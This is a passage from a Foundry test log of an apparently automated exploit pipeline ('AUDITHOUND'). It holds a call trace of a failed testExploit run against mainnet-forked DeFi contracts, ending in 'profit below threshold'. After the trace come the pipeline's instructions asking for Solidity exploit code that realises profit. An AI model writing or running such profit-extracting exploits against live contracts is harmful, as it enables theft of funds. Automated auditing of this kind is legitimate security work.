    │   │   │   │   │   │   │   ├─ [7124] 0xE62B71cf983019BFf55bC83B48601ce8419650CC::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000035ac6ae000
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000035ac6ae000
    │   │   │   │   │   │   ├─ [4963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004e6fcdd41862677729
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000002456854d7c7a4
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000002456854d7c7a4
    │   │   │   ├─  emit topic 0: 0x9f9192b5edb17356c524e08d9e025c8e2f6307e6ea52fb7968faa3081f51c3c8
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000002456854d7c7a4
    │   │   │   └─ ← [Return] true, 639264355764132 [6.392e14]
    │   │   └─ ← [Return] true, 639264355764132 [6.392e14]
    │   ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    ├─ [2344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19118659 [1.911e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6704)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 16.01s (15.99s CPU time)

Ran 1 test suite in 16.01s (16.01s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 294245)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
